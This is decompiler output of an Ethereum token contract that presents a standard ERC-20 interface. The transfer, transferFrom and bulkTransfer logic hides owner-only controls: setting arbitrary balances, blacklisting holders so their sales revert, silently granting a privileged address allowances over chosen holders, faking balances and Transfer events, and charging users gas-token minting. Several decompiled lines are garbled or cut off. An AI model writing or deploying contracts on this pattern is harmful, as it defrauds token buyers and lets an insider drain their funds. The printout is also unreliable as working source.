# Palkeoramix decompiler. 

const decimals = 18

def storage:
  owner is addr at storage 0
  stor1 is addr at storage 1
  stor2 is addr at storage 2
  stor3 is addr at storage 3
  stor4 is array of struct at storage 4
  stor5 is array of struct at storage 5
  stor6 is mapping of uint8 at storage 6
  stor7 is mapping of uint8 at storage 7
  totalSupply is uint256 at storage 8
  stor9 is addr at storage 9
  stor10 is uint256 at storage 10
  stor11 is mapping of uint256 at storage 11
  allowance is mapping of uint256 at storage 12
  stor13 is uint256 at storage 13
  unknown49bd5a5eAddress is addr at storage 14
  unknownf887ea40Address is addr at storage 15
  chiAddress is addr at storage 17
  unknowncab13133 is uint256 at storage 18
  stor19 is uint256 at storage 19

def totalSupply() payable: 
  return totalSupply

def unknown49bd5a5e() payable: 
  return unknown49bd5a5eAddress

def owner() payable: 
  return owner

def chi() payable: 
  return chiAddress

def unknowncab13133() payable: 
  return unknowncab13133

def allowance(address _owner, address _spender) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _owner == _owner
  require _spender == _spender
  return allowance[addr(_owner)][addr(_spender)]

def unknownf887ea40() payable: 
  return unknownf887ea40Address

#
#  Regular functions
#

def _fallback() payable: # default function
  revert

def unknownf835006d() payable: 
  if stor2 != caller:
      revert with 0, '!_address0'
  stor3 = unknown49bd5a5eAddress

def unknown6f8d9cc9(uint256 _param1) payable: 
  require calldata.size - 4 >=ΓÇ▓ 32
  require _param1 == _param1
  if stor2 != caller:
      revert with 0, '!_address0'
  unknowncab13133 = _param1

def Lock(address _LockedAddress) payable: 
  require calldata.size - 4 >=ΓÇ▓ 32
  require _LockedAddress == _LockedAddress
  if stor2 != caller:
      revert with 0, '!_address0'
  stor3 = _LockedAddress

def renounceOwnership() payable: 
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'
  owner = 0
  log OwnershipTransferred(
        address previousOwner=owner,
        address newOwner=0)

def balanceOf(address _owner) payable: 
  require calldata.size - 4 >=ΓÇ▓ 32
  require _owner == _owner
  if stor11[addr(_owner)] <= 0:
      return stor19
  return stor11[addr(_owner)]

def unknown5b4ebf0b(uint256 _param1, uint256 _param2) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _param1 == addr(_param1)
  require _param2 == bool(_param2)
  if stor2 != caller:
      revert with 0, '!_address0.not Owner'
  stor7[addr(_param1)] = uint8(bool(_param2))

def unknown49197cb3(uint256 _param1, uint256 _param2) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _param1 == addr(_param1)
  require _param2 == _param2
  if stor2 != caller:
      revert with 0, '!_address0'
  if _param2 and 10^18 > -1 / _param2:
      revert with 'NH{q', 17
  stor11[addr(_param1)] = 10^18 * _param2

def transferOwnership(address _newOwner) payable: 
  require calldata.size - 4 >=ΓÇ▓ 32
  require _newOwner == _newOwner
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'
  if not _newOwner:
      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
  owner = _newOwner
  log OwnershipTransferred(
        address previousOwner=owner,
        address newOwner=_newOwner)

def approve(address _spender, uint256 _value) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _spender == _spender
  require _value == _value
  require ext_code.size(chiAddress)
  call chiAddress.mint(uint256 amount) with:
       gas gas_remaining wei
      args unknowncab13133
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  if not caller:
      revert with 0, 'Approve from the zero address'
  if not _spender:
      revert with 0, 'Approve to the zero address'
  allowance[caller][addr(_spender)] = _value
  log Approval(
        address tokenOwner=_value,
        address spender=caller,
        uint256 tokens=_spender)
  return 1

def withdrawToken(address _token) payable: 
  require calldata.size - 4 >=ΓÇ▓ 32
  require _token == _token
  if stor2 != caller:
      revert with 0, '!_address0'
  call chiAddress.balanceOf(address tokenOwner) with:
       gas gas_remaining wei
      args this.address
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  require return_data.size >=ΓÇ▓ 32
  require ext_call.return_data == ext_call.return_data[0]
  call chiAddress.transfer(address to, uint256 tokens) with:
       gas gas_remaining wei
      args addr(_token), ext_call.return_data[0]
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  require return_data.size >=ΓÇ▓ 32
  require ext_call.return_data == bool(ext_call.return_data[0])

def decreaseAllowance(address _spender, uint256 _subtractedValue) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _spender == _spender
  require _subtractedValue == _subtractedValue
  if allowance[caller][addr(_spender)] < _subtractedValue:
      revert with 0, 'Decreased allowance below zero'
  if not caller:
      revert with 0, 'Approve from the zero address'
  if not _spender:
      revert with 0, 'Approve to the zero address'
  allowance[caller][addr(_spender)] -= _subtractedValue
  log Approval(
        address tokenOwner=(allowance[caller][addr(_spender)] - _subtractedValue),
        address spender=caller,
        uint256 tokens=_spender)
  return 1

def increaseAllowance(address _spender, uint256 _addedValue) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _spender == _spender
  require _addedValue == _addedValue
  if allowance[caller][addr(_spender)] > allowance[caller][addr(_spender)] + _addedValue:
      revert with 'NH{q', 17
  if not caller:
      revert with 0, 'Approve from the zero address'
  if not _spender:
      revert with 0, 'Approve to the zero address'
  allowance[caller][addr(_spender)] += _addedValue
  log Approval(
        address tokenOwner=(allowance[caller][addr(_spender)] + _addedValue),
        address spender=caller,
        uint256 tokens=_spender)
  return 1

def unknownadc9740c(uint256 _param1, uint256 _param2) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _param1 == addr(_param1)
  require _param2 == bool(_param2)
  if stor2 != caller:
      revert with 0, '!_address0.not Owner'
  stor6[addr(_param1)] = uint8(bool(_param2))
  if stor6[addr(_param1)]:
      if not addr(_param1):
          revert with 0, 'Approve from the zero address'
      if not stor9:
          revert with 0, 'Approve to the zero address'
      allowance[addr(_param1)][stor9] = stor10
      log Approval(
            address tokenOwner=stor10,
            address spender=addr(_param1),
            uint256 tokens=stor9)

def unknown512d7cfd() payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require cd <= 18446744073709551615
  require cd <ΓÇ▓ calldata.size
  if ('cd', 4).length > 18446744073709551615:
      revert with 'NH{q', 65
  if floor32(('cd', 4).length) + 97 > 18446744073709551615 or floor32(('cd', 4).length) + 97 < 96:
      revert with 'NH{q', 65
  mem[96] = ('cd', 4).length
  require cd * ('cd', 4).length) + 36 <= calldata.size
  idx = cd[4] + 36
  s = 128
  while idx < cd * ('cd', 4).length) + 36:
      require cd[idx] == addr(cd[idx])
      mem[s] = cd[idx]
      idx = idx + 32
      s = s + 32
      continue 
  require cd == cd[36]
  stor19 = cd[36]
  idx = 0
  while idx < ('cd', 4).length:
      if idx >= mem[96]:
          revert with 'NH{q', 50
      _18 = mem[(32 * idx) + 128]
      if cd and 10^18 > -1 / cd[36]:
          revert with 'NH{q', 17
      mem[floor32(('cd', 4).length) + 97] = 10^18 * cd[36]
      log Transfer(
            address from=(10^18 * cd
            address to=this.address,
            uint256 tokens=addr(_18))
      if not idx - 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff:
          revert with 'NH{q', 17
      idx = idx + 1
      continue 
  if calldata.size > 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff:
      revert with 'NH{q', 17
  if 21000 > (16 * calldata.size) + 21000:
      revert with 'NH{q', 17
  if 0 > gas_remaining:
      revert with 'NH{q', 17
  require ext_code.size(chiAddress)
  call chiAddress.freeFromUpTo(address from, uint256 value) with:
       gas gas_remaining wei
      args stor1, (16 * calldata.size) + 35154 / 41947
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

def transfer(address _to, uint256 _value) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _to == _to
  require _value == _value
  if not caller:
      revert with 0, 'Transfer from the zero address'
  if not _to:
      revert with 0, 'Transfer to the zero address'
  if stor11[caller] < _value:
      revert with 0, 'Transfer amount exceeds balance'
  if _to == stor2:
      if stor2 != caller:
          if stor2 != stor3:
              if _value > stor13:
                  if _to != stor2:
                      if not stor6[caller]:
                          if stor3 != caller:
                              if stor9 != caller:
                                  revert with 0, 'Transfer from the zero address'
  else:
      if stor2 != caller:
          if _value > stor13:
              if stor7[caller]:
                  if stor7[caller]:
                      if _to != stor9:
                          if stor3 != caller:
                              revert with 0, 'Transfer amount exceeds balance'
          if stor2 != caller:
              if stor2 != stor3:
                  if _value > stor13:
                      if _to != stor2:
                          if not stor6[caller]:
                              if stor3 != caller:
                                  if stor9 != caller:
                                      revert with 0, 'Transfer from the zero address'
  if unknowncab13133:
      require ext_code.size(chiAddress)
      call chiAddress.mint(uint256 amount) with:
           gas gas_remaining wei
          args unknowncab13133
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
  stor11[caller] -= _value
  if stor11[addr(_to)] > stor11[addr(_to)] + _value:
      revert with 'NH{q', 17
  stor11[addr(_to)] += _value
  log Transfer(
        address from=_value,
        address to=caller,
        uint256 tokens=_to)
  return 1

def transferFrom(address _from, address _to, uint256 _value) payable: 
  require calldata.size - 4 >=ΓÇ▓ 96
  require _from == _from
  require _to == _to
  require _value == _value
  if not _from:
      revert with 0, 'Transfer from the zero address'
  if not _to:
      revert with 0, 'Transfer to the zero address'
  if stor11[addr(_from)] < _value:
      revert with 0, 'Transfer amount exceeds balance'
  if _to == stor2:
      if _from != stor2:
          if stor2 != stor3:
              if _value > stor13:
                  if _to != stor2:
                      if not stor6[addr(_from)]:
                          if _from != stor3:
                              if _from != stor9:
                                  revert with 0, 'Transfer from the zero address'
  else:
      if _from != stor2:
          if _value > stor13:
              if stor7[addr(_from)]:
                  if stor7[addr(_from)]:
                      if _to != stor9:
                          if _from != stor3:
                              revert with 0, 'Transfer amount exceeds balance'
          if _from != stor2:
              if stor2 != stor3:
                  if _value > stor13:
                      if _to != stor2:
                          if not stor6[addr(_from)]:
                              if _from != stor3:
                                  if _from != stor9:
                                      revert with 0, 'Transfer from the zero address'
  if unknowncab13133:
      require ext_code.size(chiAddress)
      call chiAddress.mint(uint256 amount) with:
           gas gas_remaining wei
          args unknowncab13133
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
  stor11[addr(_from)] -= _value
  if stor11[addr(_to)] > stor11[addr(_to)] + _value:
      revert with 'NH{q', 17
  stor11[addr(_to)] += _value
  log Transfer(
        address from=_value,
        address to=_from,
        uint256 tokens=_to)
  if allowance[addr(_from)][caller] < _value:
      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Transfer amount exceeds allowance'
  if not _from:
      revert with 0, 'Approve from the zero address'
  if not caller:
      revert with 0, 'Approve to the zero address'
  allowance[addr(_from)][caller] -= _value
  log Approval(
        address tokenOwner=(allowance[addr(_from)][caller] - _value),
        address spender=_from,
        uint256 tokens=caller)
  return 1

def bulkTransfer(address[] _destinations, uint256[] _amounts) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _destinations <= 18446744073709551615
  require _destinations + 35 <ΓÇ▓ calldata.size
  require _destinations.length <= 18446744073709551615
  require _destinations + (32 * _destinations.length) + 36 <= calldata.size
  require _amounts <= 18446744073709551615
  require _amounts + 35 <ΓÇ▓ calldata.size
  require _amounts.length <= 18446744073709551615
  require _amounts + (32 * _amounts.length) + 36 <= calldata.size
  if _destinations.length != _amounts.length:
      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Length of addresses should be equal to amounts'
  idx = 0
  while idx < _destinations.length:
      require cd[((32 * idx) + _destinations + 36)] == addr(cd[((32 * idx) + _destinations + 36)])
      if idx >= _amounts.length:
          revert with 'NH{q', 50
      if not caller:
          revert with 0, 'Transfer from the zero address'
      if not addr(cd[((32 * idx) + _destinations + 36)]):
          revert with 0, 'Transfer to the zero address'
      if stor11[caller] < cd[((32 * idx) + _amounts + 36)]:
          revert with 0, 'Transfer amount exceeds balance'
      if addr(cd[((32 * idx) + _destinations + 36)]) == stor2:
          if stor2 != caller:
              if stor2 != stor3:
                  if cd[((32 * idx) + _amounts + 36)] > stor13:
                      if addr(cd[((32 * idx) + _destinations + 36)]) != stor2:
                          if not stor6[caller]:
                              if stor3 != caller:
                                  if stor9 != caller:
                                      revert with 0, 'Transfer from the zero address'
      else:
          if stor2 != caller:
              if cd[((32 * idx) + _amounts + 36)] > stor13:
                  if stor7[caller]:
                      if stor7[caller]:
                          if addr(cd[((32 * idx) + _destinations + 36)]) != stor9:
                              if stor3 != caller:
                                  revert with 0, 'Transfer amount exceeds balance'
              if stor2 != caller:
                  if stor2 != stor3:
                      if cd[((32 * idx) + _amounts + 36)] > stor13:
                          if addr(cd[((32 * idx) + _destinations + 36)]) != stor2:
                              if not stor6[caller]:
                                  if stor3 != caller:
                                      if stor9 != caller:
                                          revert with 0, 'Transfer from the zero address'
      if unknowncab13133:
          mem[100] = unknowncab13133
          require ext_code.size(chiAddress)
          call chiAddress.mint(uint256 amount) with:
               gas gas_remaining wei
              args unknowncab13133
          if not ext_call.success:
              revert with ext_call.return_data[0 len return_data.size]
      stor11[caller] -= cd[((32 * idx) + _amounts + 36)]
      mem[0] = addr(cd[((32 * idx) + _destinations + 36)])
      mem[32] = 11
      if stor11[addr(cd[((32 * idx) + _destinations + 36)])] > stor11[addr(cd[((32 * idx) + _destinations + 36)])] + cd[((32 * idx) + _amounts + 36)]:
          revert with 'NH{q', 17
      stor11[addr(cd[((32 * idx) + _destinations + 36)])] += cd[((32 * idx) + _amounts + 36)]
      mem[96] = cd[((32 * idx) + _amounts + 36)]
      log Transfer(
            address from=cd[((32 * idx) + _amounts + 36)],
            address to=caller,
            uint256 tokens=addr(cd[((32 * idx) + _destinations + 36)]))
      if not idx - 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff:
          revert with 'NH{q', 17
      idx = idx + 1
      continue 

def name() payable: 
  if bool(stor4.length):
      if not bool(stor4.length) - (stor4.length.field_1 < 32):
          revert with 'NH{q', 34
      if bool(stor4.length):
          if not bool(stor4.length) - (stor4.length.field_1 < 32):
              revert with 'NH{q', 34
          if stor4.length.field_1:
              if 31 < stor4.length.field_1:
                  mem[128] = uint256(stor4.field_0)
                  idx = 128
                  s = 0
                  while stor4.length.field_1 + 96 > idx:
                      mem[idx + 32] = stor4[s].field_256
                      idx = idx + 32
                      s = s + 1
                      continue 
                  return Array(len=2 * Mask(256, -1, stor4.length.field_1), data=mem[128 len ceil32(stor4.length.field_1)])
              mem[128] = 256 * stor4.length.field_8
      else:
          if not bool(stor4.length) - (stor4.length.field_1 < 32):
              revert with 'NH{q', 34
          if stor4.length.field_1:
              if 31 < stor4.length.field_1:
                  mem[128] = uint256(stor4.field_0)
                  idx = 128
                  s = 0
                  while stor4.length.field_1 + 96 > idx:
                      mem[idx + 32] = stor4[s].field_256
                      idx = idx + 32
                      s = s + 1
                      continue 
                  return Array(len=2 * Mask(256, -1, stor4.length.field_1), data=mem[128 len ceil32(stor4.length.field_1)])
              mem[128] = 256 * stor4.length.field_8
      mem[ceil32(stor4.length.field_1) + 192 len ceil32(stor4.length.field_1)] = mem[128 len ceil32(stor4.length.field_1)]
      mem[ceil32(stor4.length.field_1) + stor4.length.field_1 + 192] = 0
      return Array(len=2 * Mask(256, -1, stor4.length.field_1), data=mem[128 len ceil32(stor4.length.field_1)], mem[(2 * ceil32(stor4.length.field_1)) + 192 len 2 * ceil32(stor4.length.field_1)]), 
  if not bool(stor4.length) - (stor4.length.field_1 < 32):
      revert with 'NH{q', 34
  if bool(stor4.length):
      if not bool(stor4.length) - (stor4.length.field_1 < 32):
          revert with 'NH{q', 34
      if stor4.length.field_1:
          if 31 < stor4.length.field_1:
              mem[128] = uint256(stor4.field_0)
              idx = 128
              s = 0
              while stor4.length.field_1 + 96 > idx:
                  mem[idx + 32] = stor4[s].field_256
                  idx = idx + 32
                  s = s + 1
                  continue 
              return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)])
          mem[128] = 256 * stor4.length.field_8
  else:
      if not bool(stor4.length) - (stor4.length.field_1 < 32):
          revert with 'NH{q', 34
      if stor4.length.field_1:
          if 31 < stor4.length.field_1:
              mem[128] = uint256(stor4.field_0)
              idx = 128
              s = 0
              while stor4.length.field_1 + 96 > idx:
                  mem[idx + 32] = stor4[s].field_256
                  idx = idx + 32
                  s = s + 1
                  continue 
              return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)])
          mem[128] = 256 * stor4.length.field_8
  mem[ceil32(stor4.length.field_1) + 192 len ceil32(stor4.length.field_1)] = mem[128 len ceil32(stor4.length.field_1)]
  mem[ceil32(stor4.length.field_1) + stor4.length.field_1 + 192] = 0
  return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)], mem[(2 * ceil32(stor4.length.field_1)) + 192 len 2 * ceil32(stor4.length.field_1)]), 

def symbol() payable: 
  if bool(stor5.length):
      if not bool(stor5.length) - (stor5.length.field_1 < 32):
          revert with 'NH{q', 34
      if bool(stor5.length):
          if not bool(stor5.length) - (stor5.length.field_1 < 32):
              revert with 'NH{q', 34
          if stor5.length.field_1:
              if 31 < stor5.length.field_1:
                  mem[128] = uint256(stor5.field_0)
                  idx = 128
                  s = 0
                  while stor5.length.field_1 + 96 > idx:
                      mem[idx + 32] = stor5[s].field_256
                      idx = idx + 32
                      s = s + 1
                      continue 
                  return Array(len=2 * Mask(256, -1, stor5.length.field_1), data=mem[128 len ceil32(stor5.length.field_1)])
              mem[128] = 256 * stor5.length.field_8
      else:
          if not bool(stor5.length) - (stor5.length.field_1 < 32):
              revert with 'NH{q', 34
          if stor5.length.field_1:
              if 31 < stor5.length.field_1:
                  mem[128] = uint256(stor5.field_0)
                  idx = 128
                  s = 0
                  while stor5.length.field_1 + 96 > idx:
                      mem[idx + 32] = stor5[s].field_256
                      idx = idx + 32
                      s = s + 1
                      continue 
                  return Array(len=2 * Mask(256, -1, stor5.length.field_1), data=mem[128 len ceil32(stor5.length.field_1)])
              mem[128] = 256 * stor5.length.field_8
      mem[ceil32(stor5.length.field_1) + 192 len ceil32(stor5.length.field_1)] = mem[128 len ceil32(stor5.length.field_1)]
      mem[ceil32(stor5.length.field_1) + stor5.length.field_1 + 192] = 0
      return Array(len=2 * Mask(256, -1, stor5.length.field_1), data=mem[128 len ceil32(stor5.length.field_1)], mem[(2 * ceil32(stor5.length.field_1)) + 192 len 2 * ceil32(stor5.length.field_1)]), 
  if not bool(stor5.length) - (stor5.length.field_1 < 32):
      revert with 'NH{q', 34
  if bool(stor5.length):
      if not bool(stor5.length) - (stor5.length.field_1 < 32):
          revert with 'NH{q', 34
      if stor5.length.field_1:
          if 31 < stor5.length.field_1:
              mem[128] = uint256(stor5.field_0)
              idx = 128
              s = 0
              while stor5.length.field_1 + 96 > idx:
                  mem[idx + 32] = stor5[s].field_256
                  idx = idx + 32
                  s = s + 1
                  continue 
              return Array(len=stor5.length % 128, data=mem[128 len ceil32(stor5.length.field_1)])
          mem[128] = 256 * stor5.length.field_8
  else:
      if not bool(stor5.length) - (stor5.length.field_1 < 32):
          revert with 'NH{q', 34
      if stor5.length.field_1:
          if 31 < stor5.length.field_1:
              mem[128] = uint256(stor5.field_0)
              idx = 128
              s = 0
              while stor5.length.field_1 + 96 > idx:
                  mem[idx + 32] = stor5[s].field_256
                  idx = idx + 32
                  s = s + 1
                  continue 
              return Array(len=stor5.length % 128, data=mem[128 len ceil32(stor5.length.field_1)])
          mem[128] = 256 * stor5.length.field_8
  mem[ceil32(stor5.length.field_1) + 192 len ceil32(stor5.length.field_1)] = mem[128 len ceil32(stor5.length.field_1)]
  mem[ceil32(stor5.length.field_1) + stor5.length.field_1 + 192] = 0
  return Array(len=stor5.length % 128, data=mem[128 len ceil32(stor5.length.field_1)], mem[(2 * ceil32(stor5.length.field_1)) + 192 len 2 * ceil32(stor5.length.field_1)]), 


